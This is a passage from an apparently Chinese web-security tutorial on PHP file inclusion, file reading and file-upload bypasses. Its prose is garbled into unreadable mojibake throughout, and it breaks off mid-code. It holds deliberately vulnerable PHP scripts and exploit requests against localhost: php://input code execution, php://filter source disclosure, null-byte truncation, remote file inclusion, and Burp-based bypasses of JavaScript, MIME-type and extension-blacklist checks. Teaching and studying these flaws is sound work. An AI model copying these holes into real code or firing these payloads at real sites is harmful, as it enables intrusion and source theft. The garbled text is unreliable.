è¢«åŒ…å«,ä»è€Œè·å–webshell</p><p>æ–‡ä»¶åŒ…å«åˆ©ç”¨å‡½æ•°:</p><ul><li>include(å³ä½¿æ–‡ä»¶è¢«åŒ…å«è¿‡,ä¹Ÿä¼šå†æ¬¡åŒ…å«,åŒ…å«æ–‡ä»¶é‡åˆ°é”™è¯¯ä»£ç ä¹Ÿä¼šç»§ç»­æ‰§è¡Œ)</li><li>include_once(æ–‡ä»¶è¢«åŒ…å«è¿‡äº†,å°±ä¸ä¼šå†æ¬¡åŒ…å«,åŒ…å«æ–‡ä»¶é‡åˆ°é”™è¯¯ä¹Ÿä¼šç»§ç»­æ‰§è¡Œ)</li><li>require(å³ä½¿æ–‡ä»¶è¢«åŒ…å«è¿‡,ä¹Ÿä¼šå†æ¬¡åŒ…å«,åŒ…å«æ–‡ä»¶é‡åˆ°é”™è¯¯ç¨‹åºç›´æ¥é€€å‡º)</li><li>require_once(æ–‡ä»¶è¢«åŒ…å«è¿‡äº†,å°±ä¸ä¼šå†æ¬¡åŒ…å«,åŒ…å«æ–‡ä»¶é‡åˆ°é”™è¯¯ç¨‹åºç›´æ¥é€€å‡º)</li><li>â€¦</li></ul><p>æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI):</p><p>åªèƒ½åŒ…å«æœ¬æœºæ–‡ä»¶,å¤§å¤šå‡ºç°åœ¨æ¨¡å—åŠ è½½ã€æ¨¡æ¿åŠ è½½å’Œcacheè°ƒç”¨ç­‰åœ°æ–¹ã€‚<br>æœ¬åœ°æ–‡ä»¶åŒ…å«æ–¹å¼ä¹Ÿæœ‰å¤šç§,æ¯”å¦‚ä¸Šä¼ ä¸€ä¸ªå…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ ¼å¼çš„æ–‡ä»¶åœ¨åŒ…å«,åŒ…å«PHPä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶,webserverè®°å½•åˆ°æ—¥å¿—ååœ¨åŒ…å«webserverçš„æ—¥å¿—,linuxä¸‹å¯ä»¥åŒ…å«&#x2F;proc&#x2F;self&#x2F;environæ–‡ä»¶ç­‰ã€‚</p><p>eg:<br>localfileinclude.php(test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;ROOT&quot;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$mod</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mod&#x27;</span>];<br><span class="hljs-keyword">echo</span> ROOT.<span class="hljs-variable">$mod</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">include</span>(ROOT.<span class="hljs-variable">$mod</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>lfishell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/localfileinclude.php?mod=lfishell</code></p><p>è¿œç¨‹æ–‡ä»¶åŒ…å«:</p><p>å¯ä»¥åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚éœ€è¦è®¾ç½®allow_url_include&#x3D;onã€‚æ”¯æŒhttpã€ftpã€phpä¼ªåè®®ã€zipã€fileç­‰åè®®ã€‚</p><p>eg:</p><p>remotefileinclude.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨pythonå¼€å¯ä¸€ä¸ªè§åˆ°çš„æœåŠ¡å™¨:<br><code>python -m SimpleHTTPServer 8080</code></p><p>rfi.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/remotefileinclude.php?url=http://127.0.0.1:8080/Desktop/rfi.txt</code></p><p>ä½¿ç”¨ä¼ªåè®®(ä¸¾ä¸¤ä¸ªä¼ªåè®®ä¾‹å­):</p><p>php:&#x2F;&#x2F;input</p><ul><li>allow_url_fopenï¼šoff&#x2F;on</li><li>allow_url_includeï¼šon<br><code>http://127.0.0.1/remotefileinclude.php?url=php://input</code><br><code>post: &lt;?php phpinfo();?&gt;</code></li></ul><p>php:&#x2F;&#x2F;filter</p><ul><li>allow_url_fopenï¼šoff&#x2F;on</li><li>allow_url_includeï¼šoff&#x2F;on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://filter/read=convert.base64-encode/resource=remotefileinclude.php</code></li></ul><p>æˆªæ–­åŒ…å«:</p><p>00æˆªæ–­(å—é™äºGPCå’Œaddslashesç­‰å‡½æ•°å½±å“,php5.3ä¹‹åä¹Ÿä¸èƒ½ä½¿ç”¨è¿™ä¸ªæ–¹æ³•,ä¸è¿‡ç°åœ¨å¾ˆå°‘æœ‰è¿™ä¸ªæ¼æ´äº†):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‡å¦‚ä½ å‘ç°äº†æˆªæ–­åŒ…å«æ¼æ´,ç„¶ååˆåªèƒ½ä¸Šä¼ æŸäº›å›ºå®šåç¼€çš„æ–‡ä»¶,é‚£å¯ä»¥è¯•ä¸‹00æˆªæ–­</p><p><code>http://127.0.0.1/truncatedinclude.php?a=aaa.txt%00</code></p><p>å¤šä¸ª<code>.</code>å’Œ<code>/</code>æˆªæ–­,ä¸å—GPCé™åˆ¶,ä½†æ˜¯åœ¨php5.3ä¹‹åä¿®å¤</p><h3 id="æ–‡ä»¶è¯»å–-ä¸‹è½½"><a href="#æ–‡ä»¶è¯»å–-ä¸‹è½½" class="headerlink" title="æ–‡ä»¶è¯»å–(ä¸‹è½½)"></a>æ–‡ä»¶è¯»å–(ä¸‹è½½)</h3><p>ç¨‹åºåœ¨ä¸‹è½½æ–‡ä»¶æˆ–è€…è¯»å–æ˜¾ç¤ºæ–‡ä»¶çš„æ—¶å€™,è¯»å–æ–‡ä»¶çš„å‚æ•°ç›´æ¥åœ¨è¯·æ±‚ä¸­ä¼ é€’,åå°ç¨‹åºè·å–åˆ°è¿™ä¸ªæ–‡ä»¶åç›´æ¥è¯»å–è¿”å›,é—®é¢˜åœ¨äºè¿™ä¸ªå‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„,å¯ä»¥ç›´æ¥ä¼ å…¥æƒ³è¦çš„æ–‡ä»¶è·¯å¾„ã€‚</p><p>æ–‡ä»¶è¯»å–æˆ–è€…ä¸‹è½½å‡½æ•°:</p><ul><li>file_get_contents</li><li>high_light</li><li>fopen</li><li>readfile</li><li>fread</li><li>â€¦</li></ul><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/fileread.php?file=aaa.txt</code></p><h3 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p>å¦‚æœèƒ½æŠŠæ–‡ä»¶ä¸Šä¼ åˆ°ç®¡ç†å‘˜æˆ–è€…åº”ç”¨ç¨‹åºä¸æƒ³è®©ä½ ä¸Šä¼ çš„ç›®å½•,é‚£ä¹ˆå°±å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p><p>ä¸€èˆ¬çš„æ£€æµ‹æµç¨‹:</p><ul><li>å®¢æˆ·ç«¯javascriptæ ¡éªŒï¼ˆä¸€èˆ¬åªæ ¡éªŒæ–‡ä»¶çš„æ‰©å±•åï¼‰</li><li>æœåŠ¡ç«¯æ ¡éªŒ<ul><li>æ–‡ä»¶å¤´content-typeå­—æ®µæ ¡éªŒï¼ˆimage&#x2F;gifï¼‰</li><li>æ–‡ä»¶å†…å®¹å¤´æ ¡éªŒï¼ˆGIF89aï¼‰</li><li>ç›®å½•è·¯ç»æ£€æµ‹ï¼ˆæ£€æµ‹è·ŸPathå‚æ•°ç›¸å…³çš„å†…å®¹ï¼‰</li><li>æ–‡ä»¶æ‰©å±•åæ£€æµ‹ (æ£€æµ‹è·Ÿæ–‡ä»¶ extension ç›¸å…³çš„å†…å®¹)</li><li>åç¼€åé»‘åå•æ ¡éªŒ</li><li>åç¼€åç™½åå•æ ¡éªŒ</li><li>è‡ªå®šä¹‰æ­£åˆ™æ ¡éªŒ</li></ul></li><li>WAFè®¾å¤‡æ ¡éªŒï¼ˆæ ¹æ®ä¸åŒçš„WAFäº§å“è€Œå®šï¼‰</li></ul><p>åˆ©ç”¨å‡½æ•°:</p><ul><li>move_uploaded_file</li></ul><h3 id="å®¢æˆ·ç«¯æ ¡éªŒ"><a href="#å®¢æˆ·ç«¯æ ¡éªŒ" class="headerlink" title="å®¢æˆ·ç«¯æ ¡éªŒ"></a>å®¢æˆ·ç«¯æ ¡éªŒ</h3><p>jsupload.php (test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¼”ç¤ºè„šæœ¬ä¹‹jséªŒè¯</span><br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$uploaddir</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploaddir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä¿å­˜äºï¼š&#x27;</span> . <span class="hljs-variable">$uploaddir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$uploaddir</span> . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>);<br>    &#125;<br>    <span class="hljs-comment">//print_r($_FILES);</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>    &lt;title&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¼”ç¤ºè„šæœ¬--JSéªŒè¯å®ä¾‹&lt;/title&gt;<br>    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">&#x27;upfile&#x27;</span>)[<span class="hljs-number">0</span>].value;<br>            <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;ä½ è¿˜æ²¡æœ‰é€‰æ‹©ä»»ä½•æ–‡ä»¶ï¼Œä¸èƒ½ä¸Šä¼ !&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br>            <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;</span>;<br>            <span class="hljs-comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br>            <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>            <span class="hljs-comment">//alert(ext_name);</span><br>            <span class="hljs-comment">//alert(ext_name + &quot;|&quot;);</span><br>            <span class="hljs-comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br>            <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="hljs-string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;<br>                <span class="hljs-title function_ invoke__">alert</span>(errMsg);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &lt;/script&gt;<br>&lt;body&gt;<br>&lt;h3&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¼”ç¤ºè„šæœ¬--JSéªŒè¯å®ä¾‹&lt;/h3&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;ä¸Šä¼ &quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/jsupload.php</code></p><p>åˆ¤æ–­æ–¹å¼ï¼š<br>åœ¨æµè§ˆåŠ è½½æ–‡ä»¶ï¼Œä½†è¿˜æœªç‚¹å‡»ä¸Šä¼ æŒ‰é’®æ—¶ä¾¿å¼¹å‡ºå¯¹è¯æ¡†ï¼Œ(è¿›ä¸€æ­¥ç¡®å®šå¯ä»¥é€šè¿‡é…ç½®æµè§ˆå™¨HTTPä»£ç†ï¼ˆæ²¡æœ‰æµé‡ç»è¿‡ä»£ç†å°±å¯ä»¥è¯æ˜æ˜¯å®¢æˆ·ç«¯JavaScriptæ£€æµ‹ï¼‰ï¼‰å†…å®¹å¦‚ï¼šåªå…è®¸ä¼ .jpg&#x2F;.jpeg&#x2F;.pngåç¼€åçš„æ–‡ä»¶ï¼Œè€Œæ­¤æ—¶å¹¶æ²¡æœ‰å‘é€æ•°æ®åŒ…ã€‚</p><p>ç»•è¿‡æ–¹æ³•ï¼š<br>å°†éœ€è¦ä¸Šä¼ çš„æ¶æ„ä»£ç æ–‡ä»¶ç±»å‹æ”¹ä¸ºå…è®¸ä¸Šä¼ çš„ç±»å‹ï¼Œä¾‹å¦‚å°†shell.aspæ”¹ä¸ºshell.jpgä¸Šä¼ ï¼Œé…ç½®Burp Suiteä»£ç†è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åå†å°†æ–‡ä»¶åshell.jpgæ”¹ä¸ºshell.asp<br>ä¸Šä¼ é¡µé¢ï¼Œå®¡æŸ¥å…ƒç´ ï¼Œä¿®æ”¹JavaScriptæ£€æµ‹å‡½æ•°ï¼ˆå…·ä½“æ–¹æ³•ï¼šå¯ä»¥ä½¿ç”¨firebugä¹‹ç±»çš„æ’ä»¶æŠŠå®ƒç¦æ‰ï¼‰</p><h3 id="æœåŠ¡ç«¯æ£€æµ‹"><a href="#æœåŠ¡ç«¯æ£€æµ‹" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹"></a>æœåŠ¡ç«¯æ£€æµ‹</h3><h4 id="MIMEç±»å‹æ£€æµ‹"><a href="#MIMEç±»å‹æ£€æµ‹" class="headerlink" title="MIMEç±»å‹æ£€æµ‹"></a>MIMEç±»å‹æ£€æµ‹</h4><p>MIMEçš„ä½œç”¨ï¼šä½¿å®¢æˆ·ç«¯è½¯ä»¶ï¼ŒåŒºåˆ†ä¸åŒç§ç±»çš„æ•°æ®ï¼Œä¾‹å¦‚webæµè§ˆå™¨å°±æ˜¯é€šè¿‡MIMEç±»å‹æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯GIFå›¾ç‰‡ï¼Œè¿˜æ˜¯å¯æ‰“å°çš„PostScriptæ–‡ä»¶ã€‚webæœåŠ¡å™¨ä½¿ç”¨MIMEæ¥è¯´æ˜å‘é€æ•°æ®çš„ç§ç±»ï¼Œ webå®¢æˆ·ç«¯ä½¿ç”¨MIMEæ¥è¯´æ˜å¸Œæœ›æ¥æ”¶åˆ°çš„æ•°æ®ç§ç±»ã€‚</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-string">&quot;image/jpg&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we only allow uploading GIF images&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br><span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploading failed.\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;ä¸Šä¼ &quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•:<br>é…ç½®Burp Suiteä»£ç†è¿›è¡ŒæŠ“åŒ…ï¼Œå°†Content-Typeä¿®æ”¹ä¸ºimage&#x2F;gifï¼Œæˆ–è€…å…¶ä»–å…è®¸çš„ç±»å‹</p><h4 id="æ‰©å±•åæ£€æµ‹"><a href="#æ‰©å±•åæ£€æµ‹" class="headerlink" title="æ‰©å±•åæ£€æµ‹"></a>æ‰©å±•åæ£€æµ‹</h4><p>é»‘åå•æ£€æµ‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExt</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//sunstr - è¿”å›å­—ç¬¦ä¸²çš„å­ä¸²</span><br>    <span class="hljs-comment">//strripos â€” è®¡ç®—æŒ‡å®šå­—ç¬¦ä¸²åœ¨ç›®æ ‡å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$black_file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;php|jsp|asp&quot;</span>);<span class="hljs-comment">//å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ç»„</span><br>    <span class="hljs-variable">$new_upload_file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">getExt</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>])); <span class="hljs-comment">//å–å¾—è¢«.éš”å¼€çš„æœ€åå­—ç¬¦ä¸²</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$new_upload_file_ext</span>,<span class="hljs-variable">$black_file</span>))<br>    &#123;<br>        <span 